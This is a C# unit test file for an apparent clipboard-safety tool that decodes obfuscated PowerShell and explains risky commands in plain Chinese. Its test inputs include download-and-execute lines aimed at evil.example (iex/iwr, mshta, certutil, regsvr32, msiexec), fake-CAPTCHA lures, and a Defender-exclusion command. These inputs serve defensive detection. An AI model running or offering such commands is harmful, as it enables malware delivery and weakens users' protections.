using System.Text;
using ClipGuard.Core;

namespace ClipGuard.Core.Tests;

public class CommandExplainerTests
{
    private static string Enc(string script) => Convert.ToBase64String(Encoding.Unicode.GetBytes(script));

    [Theory]
    [InlineData("-enc")]
    [InlineData("-EncodedCommand")]
    [InlineData("-e")]
    [InlineData("-ec")]
    [InlineData("-EncodedC")]
    public void 解開EncodedCommand的Base64(string flag)
    {
        var text = $"powershell -w hidden {flag} {Enc("iex (iwr https://evil.example/a.ps1)")}";
        Assert.Equal("iex (iwr https://evil.example/a.ps1)", CommandExplainer.DecodeEncodedCommand(text));
    }

    [Fact]
    public void 解開缺少補位的Base64()
    {
        var b64 = Enc("Start-Process calc").TrimEnd('=');
        Assert.Equal("Start-Process calc", CommandExplainer.DecodeEncodedCommand($"pwsh -enc {b64}"));
    }

    [Theory]
    [InlineData("powershell -c \"irm https://get.scoop.sh | iex\"")]   // 沒有 -enc
    [InlineData("powershell -ExecutionPolicy Bypass -File a.ps1")]   // -ex 不是 -EncodedCommand 的縮寫
    [InlineData("powershell -enc !!!!not-base64!!!!")]
    [InlineData("powershell -enc QUJDREVGR0hJSktMTU5PUA==")]         // 合法 Base64，但不是 UTF-16LE 文字
    [InlineData("")]
    public void 沒有可解碼內容時回傳null(string text)
    {
        Assert.Null(CommandExplainer.DecodeEncodedCommand(text));
    }

    [Fact]
    public void 下載並執行說明來源網域()
    {
        var e = CommandExplainer.Explain("powershell -w hidden -c \"iex(iwr 'https://evil.example/a.ps1')\"");
        Assert.Equal("從 evil.example 下載並執行", e.Actions[0]);
        Assert.Contains("隱藏視窗，執行過程你看不到", e.Actions);
        Assert.Null(e.DecodedCommand);
    }

    [Fact]
    public void 編碼指令先解碼再說明()
    {
        var e = CommandExplainer.Explain($"powershell -WindowStyle Hidden -enc {Enc("iex (iwr https://evil.example/a.ps1)")}");
        Assert.Equal("iex (iwr https://evil.example/a.ps1)", e.DecodedCommand);
        Assert.Equal("從 evil.example 下載並執行", e.Actions[0]);
        Assert.Contains("藏了一段編碼過的指令", e.Actions);
    }

    [Fact]
    public void 無法解碼的編碼指令也要說明()
    {
        var e = CommandExplainer.Explain("powershell -enc QUJDREVGR0hJSktMTU5PUA==");
        Assert.Null(e.DecodedCommand);
        Assert.Contains("藏了一段無法解碼的編碼指令", e.Actions);
    }

    [Theory]
    [InlineData("cmd /c curl -s https://evil.example/x | powershell   # Cloudflare", "從 evil.example 下載並執行")]
    [InlineData("powershell -c \"irm get.scoop.sh | iex\"", "從 get.scoop.sh 下載並執行")]
    [InlineData("mshta https://evil.example/verify.hta # ✅ I am not a robot", "用 mshta 執行 evil.example 上的程式")]
    [InlineData("powershell iwr https://evil.example/a.exe -OutFile a.exe", "從 evil.example 下載檔案")]
    [InlineData("certutil -urlcache -f https://evil.example/a.exe a.exe", "從 evil.example 下載檔案")]
    [InlineData("regsvr32 /s /i:https://evil.example/a.sct scrobj.dll", "從 evil.example 載入並執行遠端腳本")]
    [InlineData("msiexec /q /i https://evil.example/a.msi", "從 evil.example 下載並安裝套件")]
    [InlineData("powershell Start-Process calc", "啟動其他程式")]
    [InlineData("powershell iex(iwr $u)", "從網路下載並執行")]
    public void 主要行為用白話說明(string text, string expected)
    {
        Assert.Equal(expected, CommandExplainer.Explain(text).Actions[0]);
    }

    [Fact]
    public void 多個網域都列出()
    {
        var e = CommandExplainer.Explain("powershell iex(iwr https://a.example/x); iex(iwr https://b.example/y)");
        Assert.Equal("從 a.example、b.example 下載並執行", e.Actions[0]);
    }

    [Fact]
    public void 其他危險設定()
    {
        var e = CommandExplainer.Explain("powershell -ep bypass -c Add-MpPreference -ExclusionPath C:\\");
        Assert.Contains("關閉 PowerShell 的腳本安全限制", e.Actions);
        Assert.Contains("修改 Windows Defender 設定", e.Actions);
    }

    [Fact]
    public void 看不出行為時給通用說明()
    {
        var e = CommandExplainer.Explain("cmd /c dir");
        Assert.Equal(["會執行系統指令"], e.Actions);
        Assert.Equal("會執行系統指令", e.Summary);
    }

    [Fact]
    public void 摘要用分號串起來()
    {
        var e = CommandExplainer.Explain("powershell -w hidden iex(iwr https://evil.example)");
        Assert.Equal("從 evil.example 下載並執行；隱藏視窗，執行過程你看不到", e.Summary);
    }

    [Fact]
    public void 顯示文字包含白話與解碼內容()
    {
        var e = CommandExplainer.Explain($"powershell -enc {Enc("iex (iwr https://evil.example/a.ps1)")}");
        var display = e.ToDisplayText(200);
        Assert.Contains("白話：從 evil.example 下載並執行", display);
        Assert.Contains("解碼：iex (iwr https://evil.example/a.ps1)", display);
    }

    [Fact]
    public void 顯示文字超過上限時截斷()
    {
        var e = CommandExplainer.Explain($"powershell -enc {Enc("iex (iwr https://evil.example/" + new string('a', 300) + ")")}");
        var display = e.ToDisplayText(100);
        Assert.True(display.Length <= 100);
        Assert.EndsWith("…", display);
        Assert.StartsWith("白話：", display);
    }

    [Fact]
    public void 解碼內容的換行壓成一行()
    {
        var e = CommandExplainer.Explain($"powershell -enc {Enc("$a=1\r\n\tStart-Process calc")}");
        Assert.Contains("解碼：$a=1 Start-Process calc", e.ToDisplayText(200));
    }
}
